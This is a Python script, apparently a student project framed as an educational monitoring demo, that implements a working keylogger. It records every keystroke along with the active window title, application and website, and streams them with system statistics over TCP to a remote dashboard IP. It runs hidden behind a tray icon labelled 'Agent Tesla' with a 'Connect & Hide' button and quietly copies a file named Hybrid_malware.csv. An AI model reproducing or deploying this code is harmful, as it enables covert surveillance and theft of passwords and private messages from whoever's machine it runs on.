"""
=============================================================
  HOST AGENT  (Script A)
  Educational System Monitoring Demo – FYP Project

  Captures FROM YOUR OWN MACHINE:
    • Every keystroke (character + special keys)
    • Active window title & application name at time of press
    • Context category (Browser / Terminal / Editor / etc.)
    • Live system stats: CPU, RAM, Disk, Network, Processes

  INSTALL:
    pip install psutil pynput
    Windows also needs:  pip install pywin32
    Linux also needs:    sudo apt install xdotool
    pip install pystray pillow
  USAGE:
    1. Edit DASHBOARD_IP below to match dashboard machine IP
    2. python host_agent.py
=============================================================
"""
import os
import tkinter as tk
import shutil
from tkinter import messagebox
import pystray
from PIL import Image, ImageDraw
import socket
import json
import threading
import time
import platform
import psutil
from pynput import keyboard

# ── Config ──────────────────────────────────────────────────
DASHBOARD_IP   = "" #192.168.29.44" "127.0.0.1"   # ← Change for LAN use
DASHBOARD_PORT = 9999
RECONNECT_DELAY = 4

# --- NEW: FILE COPY PATHS ---
SOURCE_CSV_PATH = r"C:\Users\sasir\OneDrive\Documents\Project\Final-year\virus\Hybrid_malware.csv"
DEST_CSV_PATH   = r"C:\Users\sasir\OneDrive\Documents\Project\Final-year\data"
# ────────────────────────────────────────────────────────────

_sock      = None
_sock_lock = threading.Lock()
_connected = threading.Event()
OS         = platform.system()          # "Windows" | "Darwin" | "Linux"

_prev_net_sent = 0
_prev_net_recv = 0


# ── Get active window info ───────────────────────────────────
def get_active_window():
    """Returns (app_name, window_title) of the focused window."""
    try:
        if OS == "Windows":
            import ctypes
            hwnd   = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf    = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            title  = buf.value or "Unknown"
            pid    = ctypes.c_ulong()
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            try:
                app = psutil.Process(pid.value).name()
            except Exception:
                app = "Unknown"
            return app, title


        else:                           # Linux – requires xdotool
            import subprocess
            wid   = subprocess.check_output(["xdotool", "getactivewindow"],
                                            stderr=subprocess.DEVNULL).decode().strip()
            title = subprocess.check_output(["xdotool", "getwindowname", wid],
                                            stderr=subprocess.DEVNULL).decode().strip()
            pid   = subprocess.check_output(["xdotool", "getwindowpid", wid],
                                            stderr=subprocess.DEVNULL).decode().strip()
            try:
                app = psutil.Process(int(pid)).name()
            except Exception:
                app = "Unknown"
            return app, title

    except Exception:
        return "Unknown", "Unknown"


def classify_context(app: str) -> str:
    a = app.lower()
    if any(b in a for b in ["chrome","firefox","edge","safari","opera","brave","msedge"]):
        return "Browser"
    if any(b in a for b in ["code","pycharm","idea","sublime","atom","notepad++","vim","nano","gedit"]):
        return "Code Editor"
    if any(b in a for b in ["word","excel","powerpoint","libreoffice","writer","calc","impress"]):
        return "Office"
    if any(b in a for b in ["terminal","cmd","powershell","bash","konsole","iterm","hyper","wt.exe","alacritty"]):
        return "Terminal"
    if any(b in a for b in ["discord","slack","teams","telegram","whatsapp","signal","skype"]):
        return "Messaging"
    if any(b in a for b in ["notepad","textedit","kate","geany"]):
        return "Text Editor"
    return "App"
#================== Context classification based on app name ==================
def extract_website_name(app: str, title: str) -> str:
    """Extracts the website name from the browser window title."""
    a = app.lower()
    # Check if the current app is actually a browser
    if not any(b in a for b in ["chrome", "firefox", "edge", "safari", "opera", "brave", "msedge"]):
        return "—" 
        
    clean_title = title
    # 1. Strip the browser name from the end of the title
    browser_suffixes = [
        " - Google Chrome", " — Mozilla Firefox", " - Personal - Microsoft​ Edge", 
        " - Microsoft Edge", " - Brave", " - Opera"
    ]
    for suffix in browser_suffixes:
        if clean_title.endswith(suffix):
            clean_title = clean_title[:-len(suffix)] # Remove the suffix
            
    # 2. Extract the website name (usually the last part after a dash)
    # Example: "Inbox (12) - user@email.com - Gmail" -> We want "Gmail"
    parts = clean_title.split(" - ")
    if len(parts) > 1:
        return parts[-1].strip()
    
    # Fallback if there are no dashes
    return clean_title.strip()

# ── Socket send ──────────────────────────────────────────────
def send_packet(packet: dict):
    global _sock
    try:
        raw = json.dumps(packet) + "\n"
        with _sock_lock:
            if _sock:
                _sock.sendall(raw.encode("utf-8"))
    except (BrokenPipeError, OSError):
        _connected.clear()


# ── Thread 1: System stats ───────────────────────────────────
def system_monitor_thread():
    global _prev_net_sent, _prev_net_recv
    print("[Agent] System monitor started.")
    while True:
        _connected.wait()
        try:
            cpu  = psutil.cpu_percent(interval=None)
            ram  = psutil.virtual_memory()
            net  = psutil.net_io_counters()
            disk = psutil.disk_usage("/")

            ds = max(0, net.bytes_sent - _prev_net_sent)
            dr = max(0, net.bytes_recv - _prev_net_recv)
            _prev_net_sent = net.bytes_sent
            _prev_net_recv = net.bytes_recv

            send_packet({
                "type": "sys_stats",
                "data": {
                    "cpu_percent":  round(cpu, 1),
                    "ram_percent":  round(ram.percent, 1),
                    "ram_used_mb":  round(ram.used  / 1024**2, 1),
                    "ram_total_mb": round(ram.total / 1024**2, 1),
                    "disk_percent": round(disk.percent, 1),
                    "disk_used_gb": round(disk.used  / 1024**3, 2),
                    "disk_total_gb":round(disk.total / 1024**3, 2),
                    "net_sent_ps":  ds,
                    "net_recv_ps":  dr,
                    "proc_count":   len(psutil.pids()),
                    "platform":     OS,
                }
            })
        except Exception as e:
            print(f"[Agent] Stats error: {e}")
        time.sleep(1)


# ── Thread 2: Keylogger ──────────────────────────────────────
def start_keylogger():
    print("[Agent] Keylogger started.")

    def on_press(key):
        if not _connected.is_set():
            return
        try:
            char     = key.char or ""
            key_type = "char"
        except AttributeError:
            char     = key.name      # e.g. "space", "enter", "backspace"
            key_type = "special"

        app, title = get_active_window()
        context    = classify_context(app)
        website    = extract_website_name(app, title)

        send_packet({
            "type": "keystroke",
            "data": {
                "key":      char,
                "key_type": key_type,
                "app":      app,
                "title":    title,
                "context":  context,
                "website":  website,
                "ts":       time.strftime("%H:%M:%S"),
            }
        })

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


# ── Connection manager (auto-reconnect) ──────────────────────
def connect_loop():
    global _sock
    while True:
        try:
            print(f"[Agent] Connecting to {DASHBOARD_IP}:{DASHBOARD_PORT} ...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((DASHBOARD_IP, DASHBOARD_PORT))
            with _sock_lock:
                _sock = s
            _connected.set()
            print("[Agent] ✓ Connected to dashboard.")
            while _connected.is_set():
                time.sleep(0.5)
        except (ConnectionRefusedError, OSError) as e:
            print(f"[Agent] Failed ({e}). Retrying in {RECONNECT_DELAY}s ...")
            _connected.clear()
            with _sock_lock:
                _sock = None
            time.sleep(RECONNECT_DELAY)


# ════════════════════════════════════════════════════════
#  SYSTEM TRAY & UI LOGIC
# ════════════════════════════════════════════════════════

def create_tray_icon():
    """Draws a simple green circle icon for the system tray"""
    image = Image.new('RGB', (64, 64), color=(13, 15, 24))
    draw = ImageDraw.Draw(image)
    draw.ellipse((16, 16, 48, 48), fill=(0, 229, 160)) # Green dot
    return image

def exit_agent(icon, item):
    """Kills the background agent when you click Exit in the tray"""
    icon.stop()
    os._exit(0)  # Force kills all hidden threads instantly

def start_background_tasks(ip):
    """Starts the stealthy background monitoring"""
    global DASHBOARD_IP
    DASHBOARD_IP = ip

    # 1. Start all monitoring threads
    threading.Thread(target=system_monitor_thread, daemon=True).start()
    threading.Thread(target=start_keylogger, daemon=True).start()
    
    # 2. Start the connection loop in a thread so it doesn't freeze the icon
    threading.Thread(target=connect_loop, daemon=True).start()

    # 3. Create the System Tray Icon (This keeps the script alive in the background)
    icon = pystray.Icon("HostAgent", create_tray_icon(), "Agent Tesla", menu=pystray.Menu(
        pystray.MenuItem('Stop & Exit', exit_agent)
    ))
    icon.run()

def show_setup_ui():
    """Shows the initial Tkinter popup for the IP address"""
    root = tk.Tk()
    root.title("Agent Setup")
    root.geometry("320x160")
    root.configure(bg="#0a0e27") # Dark cyber theme

    tk.Label(root, text="Enter Dashboard IP Address:", fg="#00d9ff", bg="#0a0e27", 
             font=("Segoe UI", 10, "bold")).pack(pady=(20, 5))

    ip_entry = tk.Entry(root, width=25, font=("Consolas", 11), justify="center")
    ip_entry.insert(0, "192.168.") # Helpful starting text
    ip_entry.pack(pady=5)

    def on_connect():
        ip = ip_entry.get().strip()
        if not ip:
            messagebox.showerror("Error", "Please enter an IP address.")
            return
        # --- Data Exchange ---
        try:
            shutil.copy2(SOURCE_CSV_PATH, DEST_CSV_PATH)
            print(f"[Agent] CSV successfully copied to {DEST_CSV_PATH}")
        except Exception as e:
            print(f"[Agent] Failed to copy CSV: {e}")
            # Optional: Uncomment the next line if you want a popup warning when the copy fails
            messagebox.showwarning("File Error", f"Could not copy the data file.\n{e}")
        # ------------------------------
        
        root.destroy()  # Destroys the UI window completely!
        start_background_tasks(ip)  # Hands off to the background/tray logic

    tk.Button(root, text="Connect & Hide", bg="#00ff88", fg="black", 
              font=("Segoe UI", 9, "bold"), cursor="hand2", command=on_connect).pack(pady=15)

    root.eval('tk::PlaceWindow . center') # Centers window on screen
    root.mainloop()

if __name__ == "__main__":
    show_setup_ui()